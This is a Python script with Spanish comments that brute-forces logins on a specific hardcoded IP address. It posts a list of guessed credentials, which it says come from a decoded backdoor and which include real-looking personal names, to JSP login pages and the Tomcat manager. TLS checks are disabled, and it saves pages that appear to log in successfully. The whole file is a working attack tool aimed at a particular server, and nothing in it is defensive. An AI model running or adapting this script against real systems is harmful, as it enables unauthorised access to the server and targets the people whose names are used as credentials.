#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def backdoor_based_bruteforce():
    target = "https://189.254.143.102"
    
    # Credenciales BASADAS EN LA INFORMACIÓN DEL BACKDOOR DECODIFICADA
    credentials = [
        # Del backdoor: "Jose Tono Garcia", "Danyel Sp", "ISCT", "SpRanch"
        ("jose", "tono"), ("tono", "garcia"), ("jose.tono", "garcia"),
        ("danyel", "sp"), ("dnylsp", "spranch"), ("isct", "2010"),
        ("sito", "uts"), ("sito", "utslp"), ("admin", "sito"),
        ("jose", "ISCT2010"), ("tono", "ISCT2010"), ("danyel", "Spr@nch2010"),
        ("dnylsp", "SpRanch"), ("admin", "Utslp2024"), ("sito", "Utslp2024"),
        ("jose", "SITO"), ("tono", "SITO"), ("danyel", "SITO"),
        ("manager", "SITO"), ("tomcat", "SITO")
    ]
    
    print("=== FUERZA BRUTA BASADA EN BACKDOOR ===")
    
    for username, password in credentials:
        # Probar en múltiples endpoints
        endpoints = [
            "/jsp/login.jsp", 
            "/manager/html",
            "/jsp/menu.jsp"
        ]
        
        for endpoint in endpoints:
            try:
                # Preparar datos de login
                login_data = {
                    'usuario': username,
                    'contrasena': password,
                    'password': password, 
                    'user': username,
                    'username': username,
                    'xUsuario': username,
                    'xContrasena': password
                }
                
                # Headers comunes
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                session = requests.Session()
                r = session.post(
                    f"{target}{endpoint}", 
                    data=login_data,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False  # Importante para ver respuestas reales
                )
                
                # Análisis de respuesta
                if r.status_code in [200, 302]:
                    if "incorrecto" not in r.text.lower() and "error" not in r.text.lower():
                        if r.status_code == 302:
                            print(f"🔓 REDIRECCIÓN CON {username}:{password} en {endpoint} -> {r.headers.get('Location', 'N/A')}")
                        else:
                            print(f"⚠️  Respuesta positiva con {username}:{password} en {endpoint} (Status: {r.status_code})")
                        
                        # Guardar respuesta exitosa
                        with open(f"success_{username}_{password}.html", "w") as f:
                            f.write(r.text)
                            
            except Exception as e:
                pass

if __name__ == "__main__":
    backdoor_based_bruteforce()
